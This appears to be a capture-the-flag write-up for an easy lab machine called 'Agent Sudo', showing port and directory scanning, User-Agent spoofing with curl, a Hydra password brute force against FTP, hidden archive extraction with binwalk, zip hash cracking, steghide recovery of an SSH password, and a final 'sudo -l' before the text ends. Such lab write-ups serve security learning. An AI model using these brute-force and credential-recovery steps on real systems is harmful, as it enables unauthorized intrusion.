# Agent Sudo (Easy)

# 1. Deploy and Enumerate:

- Scanning the machine with `nmap` and `goubuster`:

```bash
nmap -sV -A -v <IP-Target>
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)
|   256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)
|_  256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Annoucement

```

```bash
gobuster dir -u http://<IP> -w /usr/share/wordlist/dirbuster/directory-list-2.3-medium.txt -x.txt,.php,.html,.css -t64
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.124.168
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html,txt,css
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 278]
/.html                (Status: 403) [Size: 278]
/index.php            (Status: 200) [Size: 218]
```

- We check port 80/tcp http and /index.php:

![Untitled](https://github.com/user-attachments/assets/94282b83-e8c4-4992-b587-3805ee838323)

—> We can’t direct into another page normally so We need to redirect yourself to a secret page by using “user-agent” in the `Developer Tools` 

![Untitled 1](https://github.com/user-attachments/assets/daf8437e-1791-4c1a-9bb1-5a99ff20a0c6)

- We go part “Network” and reload the page and see the information the page `/index.php`
- We can use the hint message “Use your own codename as user-agent to access the site.” and edit “User-Agent” in `Request Headers`
- We replace the “User-Agent” by Agent-R and send the request:

![Untitled 2](https://github.com/user-attachments/assets/55eba990-4412-417f-afd5-b87630267c94)

—> The new secret Message!!!

- Now we can try guess the codename of the user-agent we want. We can replace the character in “User-Agent” by the character in the Alphabet.

![Untitled 3](https://github.com/user-attachments/assets/a5eca304-130a-4504-a2ae-bb7e35469f7d)

—> We have the result the character is “C” and the name of user-agent we want to know that is “Chris”

- OPTION 2:
- Use command `curl` to transfer URL:

```bash
curl -A "R" -L <IP>
What are you doing! Are you one of the 25 employees? If not, I going to report this incident
<!DocType html>
<html>
<head>
	<title>Annoucement</title>
</head>

<body>
<p>
	Dear agents,
	<br><br>
	Use your own <b>codename</b> as user-agent to access the site.
	<br><br>
	From,<br>
	Agent R
</p>
</body>
</html>
```

```bash
curl -A "C" -L <IP>
Attention chris, <br><br>

Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak! <br><br>

From,<br>
Agent R 
```

# 2. Hash cracking and brute force

- First we will use `Hydra` to brute force the password service `FTP`:

```bash
hydra -t14 -l chris -P /usr/share/wordlists/rockyou.txt -vV 10.10.124.168 ftp
ATTEMPT] target 10.10.124.168 - login "chris" - pass "jesus1" - 248 of 14344399 [child 3] (0/0)
[ATTEMPT] target 10.10.124.168 - login "chris" - pass "crystal" - 249 of 14344399 [child 4] (0/0)
[ATTEMPT] target 10.10.124.168 - login "chris" - pass "celtic" - 250 of 14344399 [child 6] (0/0)
[ATTEMPT] target 10.10.124.168 - login "chris" - pass "zxcvbnm" - 251 of 14344399 [child 9] (0/0)
[ATTEMPT] target 10.10.124.168 - login "chris" - pass "edward" - 252 of 14344399 [child 8] (0/0)
[21][ftp] host: 10.10.124.168   login: chris   password: crystal
[STATUS] attack finished for 10.10.124.168 (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-04-24 21:23:03
```

—> The password: crystal and The user name: chris

- Login the FTP:

```bash
ftp <IP>
Connected to 10.10.124.168.
220 (vsFTPd 3.0.3)
Name (10.10.124.168:zicco): chris
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||20945|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png
226 Directory send OK.
ftp> 
```

- We transfer all file to your machine:

```bash
mget *
mget To_agentJ.txt [anpqy?]? Y
229 Entering Extended Passive Mode (|||32724|)
150 Opening BINARY mode data connection for To_agentJ.txt (217 bytes).
100% |*********************************************************************|   217        3.13 MiB/s    00:00 ETA
226 Transfer complete.
217 bytes received in 00:00 (0.54 KiB/s)
mget cute-alien.jpg [anpqy?]? Y
229 Entering Extended Passive Mode (|||9322|)
150 Opening BINARY mode data connection for cute-alien.jpg (33143 bytes).
100% |*********************************************************************| 33143       83.31 KiB/s    00:00 ETA
226 Transfer complete.
33143 bytes received in 00:00 (41.50 KiB/s)
mget cutie.png [anpqy?]? Y
229 Entering Extended Passive Mode (|||31628|)
150 Opening BINARY mode data connection for cutie.png (34842 bytes).
100% |*********************************************************************| 34842       87.51 KiB/s    00:00 ETA
226 Transfer complete.
34842 bytes received in 00:00 (43.69 KiB/s)
ftp> 
```

- We see the hint in the file To_agentJ.txt and know the login password will be stored in the picture.
- Now we use tool `binwalk` - Check out if other files are embedded/appended:

```bash
binwalk cutie.png
DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
869           0x365           Zlib compressed data, best compression
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820         0x8804          End of Zip archive, footer length: 22
```

```bash
binwalk cute-alien.jpg
DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             JPEG image data, JFIF standard 1.01
```

—> cutie.png has the Zip file

- We use binwalk to extract the cutie.png

```bash
binwalk -e --run-as=root cutie.png
```

![Untitled 4](https://github.com/user-attachments/assets/96676fca-4f72-4335-a9b7-d29f3f47bc0d)

—> We hash: “$zip2$*0*1*0*4673cae714579045*67aa*4e*61c4cf3af94e649f827e5964ce575c5f7a239c48fb992c8ea8cbffe51d03755e0ca861a5a3dcbabfa618784b85075f0ef476c6da8261805bd0a4309db38835ad32613e3dc5d7e87c0f91c0b5e64e*4969f382486cb6767ae6*$/zip2$” —> password zip file: alien.

- Using `7zz zip` to unzip the file zip:

```bash
./7zz x /home/zicco/_cutie.png.extracted/8702.zip
7-Zip (z) 24.03 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-03-23
 64-bit locale=en_US.UTF-8 Threads:128 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 280 bytes (1 KiB)                  

Extracting archive: /home/zicco/_cutie.png.extracted/8702.zip
--
Path = /home/zicco/_cutie.png.extracted/8702.zip
Type = zip
Physical Size = 280

    
Enter password:alien

Everything is Ok

Size:       86
Compressed: 280
```

```bash
cat To_agentR.txt
Agent C,

We need to send the picture to 'QXJlYTUx' as soon as possible!

By,
Agent R
```

—> “QXJlYTUx”: Base64 Encoded String —> Decode the steg password: “Area51”.

- We have the steg passphare and now we will use `steghide` to check the message behind the image .jpg:

```bash
steghide extract -sf cute-alien.jpg -p Area51
extract, --extract      extract data
-sf, --stegofile        select stego file
-p, --passphrase        specify passphrase
```

—> wrote extracted data to "message.txt".

```bash
cat message.txt 
Hi james,

Glad you find this message. Your login password is hackerrules!

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris
```

—> User another: James and SSH Password: hackerrules!

- Login SSH service:

![Untitled 5](https://github.com/user-attachments/assets/772eab4a-a118-468c-b7c1-334b2db5093d)

# 3. Privilege Escalation

```bash
sudo -l 
```
- We can see the command we can use without root!!!
